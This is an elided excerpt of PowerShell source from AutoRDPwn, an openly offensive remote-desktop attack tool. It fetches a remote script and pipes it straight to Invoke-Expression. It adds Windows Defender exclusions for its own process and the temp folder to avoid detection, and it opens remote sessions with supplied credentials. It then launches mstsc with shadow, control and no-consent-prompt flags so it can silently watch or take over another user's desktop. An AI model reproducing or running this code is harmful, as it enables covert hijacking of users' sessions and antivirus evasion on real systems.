...
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.6 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Disable-Close.ps1" -UseBasicParsing | iex
...
if($Language -in 'Spanish') {
  ...
  $Pwn6  = "Agente de sesión de RDP" }
    ...
    Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null
	...
	if($PlainTextPassword = $null) { Write-Host "******" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
   ...
   $RDP = New-PSSession -Computer $computer -credential $credential } ; $session = get-pssession ; if ($session){
    ...
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\7516b95f-f776-4464-8c53-06167f40cc99\8EC4B3A5-6868-48c2-BE75-4F3044BE88A7" /v Attributes /t REG_DWORD /d 1 /f 2>&1> $null }}
        ...
        if($stickykeys){ mstsc /v $computer /admin /f ; $control = $null }
        if($control -eq 'true') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}
...
Remove-MpPreference -ExclusionProcess $pid 2>&1> $null ; Remove-MpPreference -ExclusionPath $env:temp 2>&1> $null
